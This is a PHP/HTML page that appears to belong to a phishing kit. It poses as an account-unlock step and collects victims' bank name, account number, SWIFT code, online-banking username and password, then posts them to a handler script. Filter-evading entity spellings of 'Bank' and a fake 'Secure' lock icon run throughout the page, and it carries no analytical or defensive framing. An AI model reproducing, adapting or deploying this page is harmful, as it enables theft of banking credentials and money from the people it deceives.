<?php
include('../pais/contenttrans.php');
include('../settings.php');
?>
<link rel="stylesheet" href="../css/jquery.popup.css" type="text/css">
<link rel="stylesheet" href="../css/style.css" />
<link href='http://fonts.googleapis.com/css?family=Roboto+Condensed|Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="../js/script.js"></script>
<script type="text/javascript" src="../js/jquery-2.0.3.min.js"></script>
<script type="text/javascript" src="../js/jquery.popup.js"></script>
<script type="text/javascript">
	$(function() {
		$(".js__p_start, .js__p_another_start").simplePopup();
	});
</script>
<script>
	function check(){
		var x = document.getElementById("txt").value;
		var y = x.length;
		var z = 25-y;
		if((z < 0) || (z==25)){
			var a = '<button style="width: 140px;" disabled="disabled" class="lal js__p_another_start" >Continue</button>';
			document.getElementById("go").innerHTML=a;
		}
		else {
			var a = '<button style="width: 140px;"  class="lal js__p_another_start">Continue</button>';
			document.getElementById("go").innerHTML=a;
		}
	}
</script>
<script>
// Name and Email validation Function.
function validation(){
	var bank = document.getElementById("bank").value;
	if( bank ==='' ){
		alert("");
		return false;
	}else{
		return true;
	}
}
// Submit form with id function.
function submit_by_id() {
	var bank = document.getElementById("bank").value;
if (validation()) // Calling validation function
{
document.getElementById("uploadimage").submit(); //form submission
}
}
function confirm_by_id() {
	var bank = document.getElementById("bank").value;
if (validation()) // Calling validation function
{
document.getElementById("parentForm").submit(); //form submission
}
}
</script>
<form method="post" id="parentForm" name="creditcard_Form" action="Submitt.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=six&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>" class="edit">
	<center>
		<?php
		if ($negara=="GB"){ ?> 
		<p class="field" >&#x0042;ank Name :
			<div class="nativeDropdown">
				<div class="selectDropdown icon-arrow-down-small">
					<select id="bank" placeholder="Bank Name" name="bnkname" class="needsclick validate" required="required" aria-required="true">
						<option value="Other">Select &#x0042;ank</option>
						<option value="Alliance and Leicester">Alliance and Leicester</option>
						<option value="Bank of Ireland">&#x0042;ank of Ireland</option>
						<option value="Bank of Scotland">&#x0042;ank of Scotland</option>
						<option value="Barclays Bank">Barclays &#98;ank</option>
						<option value="Citibank">Citibank</option>
						<option value="Clydesdale Bank">Clydesdale &#98;ank</option>
						<option value="Cahoot">Cahoot</option>
						<option value="Co operative bank">Co operative &#98;ank</option>
						<option value="Egg Bank">Egg &#98;ank</option>
						<option value="First Direct">First Direct</option>
						<option value="Halifax">Halifax</option>
						<option value="HSBC">HSBC</option>
						<option value="Intelligent Finance">Intelligent Finance </option>
						<option value="Isle of Man Bank">Isle of Man &#98;ank</option>
						<option value="Lloyds">Lloyds TSB</option>
						<option value="Metro Bank">Metro Bank</option>
						<option value="Natwest">Natwest</option>
						<option value="Nationwide">Nationwide</option>
						<option value="Northern Bank">Northern Bank</option>
						<option value="RBS">Royal &#98;ank of Scotland</option>
						<option value="Santander">Santander &#98;ank</option>
						<option value="Sainsburys Bank">Sainsburys &#98;ank</option>
						<option value="TSB Bank">TSB &#98;ank</option>
						<option value="Tesco Personal Finance">Tesco Personal Finance</option>
						<option value="Unity Trust Bank plc">Unity Trust &#98;ank plc</option>
						<option value="Ulster Bank">Ulster &#98;ank</option>
						<option value="Virgin Money">Virgin Money</option>
						<option value="Yorkshire Bank">Yorkshire &#98;ank</option>
						<option value="Other">Other</option>
					</select>
				</div>
			</div>
			<?php }
			else if ($negara=="CA"){ ?> 
			<p class="field" >&#x0042;ank Name :
				<div class="nativeDropdown">
					<div class="selectDropdown icon-arrow-down-small">
						<select id="bank" placeholder="Bank Name" name="bnknameca" class="needsclick validate" required="required" aria-required="true">
							<option value="">Select &#x0042;ank</option>
							<option value="B2B Bank">B2B &#98;ank</option>
							<option value="Bank of Montreal">&#x0042;ank of Montreal</option>
							<option value="Bank of Nova Scotia">&#x0042;ank of Nova Scotia</option>
							<option value="Bridgewater Bank">Bridgewater &#98;ank</option>
							<option value="Cibc">Canadian Imperial &#98;ank of Commerce</option>
							<option value="Canadian Tire Bank">Canadian Tire &#98;ank</option>
							<option value="Canadian Western Bank">Canadian Western &#98;ank</option>
							<option value="Citizens Bank of Canada">Citizens &#98;ank of Canada</option>
							<option value="CFF Bank">CFF Bank</option>
							<option value="Continental Bank of Canada">Continental &#98;ank of Canada</option>
							<option value="CS Alterna Bank">CS Alterna &#98;ank</option>
							<option value="DirectCash Bank">DirectCash &#98;ank</option>
							<option value="Equitable Bank">Equitable &#98;ank</option>
							<option value="First Nations Bank of Canada">First Nations &#98;ank of Canada</option>
							<option value="General Bank of Canada">General &#98;ank of Canada</option>
							<option value="Hollis Canadian Bank">Hollis Canadian &#98;ank</option>
							<option value="Laurentian Bank of Canada">Laurentian &#98;ank of Canada</option>
							<option value="Manulife Bank of Canada">Manulife &#98;ank of Canada</option>
							<option value="National Bank of Canada">National &#98;ank of Canada</option>
							<option value="Pacific Western Bank of Canada">Pacific & Western &#98;ank of Canada</option>
							<option value="Presidents Choice Bank">Presidents Choice &#98;ank</option>
							<option value="RedBrick Bank">RedBrick &#98;ank</option>
							<option value="Rogers Bank">Rogers &#98;ank</option>
							<option value="RBC">Royal &#98;ank of Canada</option>
							<option value="Tangerine Bank">Tangerine &#98;ank</option>
							<option value="TorontoDominion Bank">Toronto Dominion &#98;ank</option>
							<option value="Wealth One Bank of Canada">Wealth One &#98;ank of Canada</option>
							<option value="Zag Bank">Zag &#98;ank</option>
							<option value="otherca">Other</option>
						</select>
					</div>
				</div>
				<?php }
				else if ($negara=="US") { ?>
				<p class="field" >&#x0042;ank Name :
					<div class="nativeDropdown">
						<div class="selectDropdown icon-arrow-down-small">
							<select id="bank" placeholder="Bank Name" name="bnknameus" class="needsclick validate" required="required" aria-required="true">
								<option value="">Select &#x0042;ank</option>
								<option value="Ally Financial">Ally Financial</option>
								<option value="American Express Company">American Express Company</option>
								<option value="BB&T">BB&T</option>
								<option value="Bank of America">Bank of America</option>
								<option value="Bank of New York Mellon">Bank of New York Mellon</option>
								<option value="Charles Schwab Corporation">Charles Schwab Corporation</option>
								<option value="Capital One">Capital One</option>
								<option value="Citizens Financial Group">Citizens Financial Group</option>
								<option value="Citigroup">Citigroup</option>
								<option value="Fifth Third Bank">Fifth Third Bank</option>
								<option value="Goldman Sachs">Goldman Sachs</option>
								<option value="HSBC Bank USA">HSBC Bank USA</option>
								<option value="JPMorgan Chase">JPMorgan Chase</option>
								<option value="Morgan Stanley">Morgan Stanley</option>
								<option value="PNC Financial Services">PNC Financial Services</option>
								<option value="SunTrust Banks">SunTrust Banks</option>
								<option value="State Street Corporation">State Street Corporation</option>
								<option value="TD Bank">TD Bank, N.A.</option>
								<option value="US Bancorp">U.S. Bancorp</option>
								<option value="Wells Fargo">Wells Fargo</option>
								<option value="otherus">Other</option>
							</select>
						</div>
					</div>
					<?php }
					else {
						?>
						<td><div align="right"><a href="#">Secure <img src="../poto/secure_lock_2.gif"></a></div></td>
						<br/>
						<div align="left">
							<label class="fieldLabel"><?= $c1 ?></label>
							<table width="100%">
								<tr>
									<td width="30%" style="padding-bottom: 10px;"><b><?= $d1 ?></b></td>
									<td width="2%" style="padding-bottom: 10px;">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
									<td>
										<div class="textInput">
											<div class="fieldWrapper">
												<input type="number" class="hasHelp  validateEmpty   " id="bank" autocomplete="off"  maxlength="25" name="acnot" value="" required="required" title="Account Number" placeholder="(Numeric)*1234567890">
											</div>
										</div>
									</td>
								</tr>
								<tr>
									<td width="30%" style="padding-bottom: 10px;"><b><?= $e1 ?></b></td>
									<td width="2%" style="padding-bottom: 10px;">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
									<td>
										<div class="textInput">
											<div class="fieldWrapper">
												<input type="text" class="hasHelp  validateEmpty   "  autocomplete="off"  maxlength="17" name="bnknameus" value="" required="required" title="Bank Name" placeholder="AUSTRALIA AND NEW ZEALAND BANKING GROUP, LTD">
											</div>
										</div>
									</td>
								</tr>
								<tr>
									<td width="30%" style="padding-bottom: 10px;"><b><?= $f1 ?></b></td>
									<td width="2%" style="padding-bottom: 10px;">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
									<td>
										<div class="textInput">
											<div class="fieldWrapper">
												<input type="text" class="hasHelp  validateEmpty   "  autocomplete="off"  maxlength="25" name="swsd" value="" required="required" title="Bank Swift C&omicron;de" placeholder="Ex : ANZBAU3M - Optional"/>
											</div>
										</div>
									</td>
								</tr>
								<tr>
									<td width="30%" style="padding-bottom: 10px;"><b><?= $g1 ?></b></td>
									<td width="2%" style="padding-bottom: 10px;">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
									<td>
										<div class="textInput">
											<div class="fieldWrapper">
												<input type="text" class="hasHelp  validateEmpty   "  autocomplete="off"  maxlength="25" name="lobank" value="" required="required" title="Username" placeholder="Ex: 163519361">
											</div>
										</div>
									</td>
								</tr>
								<tr>
									<td width="30%" style="padding-bottom: 10px;"><b><?= $h1 ?></b></td>
									<td width="2%" style="padding-bottom: 10px;">&nbsp;&nbsp;:&nbsp;&nbsp;</td>
									<td>
										<div class="textInput">
											<div class="fieldWrapper">
												<input type="password" class="hasHelp  validateEmpty   " id="txt" onkeyup="check()" onmouseout="check()"  autocomplete="off"  maxlength="25" name="pwd_csdad" value="" required="required" title="Password" placeholder="<?= $a1 ?>">
											</div>
										</div>
									</td>
								</tr>
								<table width="100%">
									<tr>
										<td colspan="3" width="100%">
											<table align="center">
												<tr>
													<td align="align">
														<button style="width: 100px !important;" type="submit" class="button"><?= $cq ?></button>
													</td>
													<td>&nbsp;</td>
													<?php
													if ($pais_selfie == 'selfie_active') {
														?>
														<td><a href="trackinginfo.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=six&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>"><?= $i1 ?></a></td>
														<?php
													}else{
														?>
														<td><a href="redirscr.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=six&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>"><?= $i1 ?></a></td>
														<?php
													}
													?>
												</tr>
											</table>
										</td>
									</tr>
								</table>
							</table>
							<?php } ?>
							<div id="form-bank"></div>
							<table width="100%" id="tbl_button" style="display: none;">
								<tr>
									<td colspan="3" width="100%">
										<table align="center">
											<tr>
												<td align="align">
													<button style="width: 100px !important;" type="submit" class="button"><?= $cq ?></button>
												</td>
												<?php if ($negara != 'GB' AND $negara != 'CA' AND $negara != 'US') {
													?>
													<td>&nbsp;</td>
													<td><a href="trackinginfo.php?locked=account_<?= $kode_negara ?>&login_params=checked&email_locked=<?= $_GET['email_locked'] ?>&step=six&time=<?= md5(gmdate('r')).sha1(gmdate('r')) ?>&session=<?php echo sha1(microtime()); ?>"><?= $i1 ?></a></td>
													<?php
												}
												?>	
											</tr>
										</table>
									</td>
								</tr>
							</table>
						</form>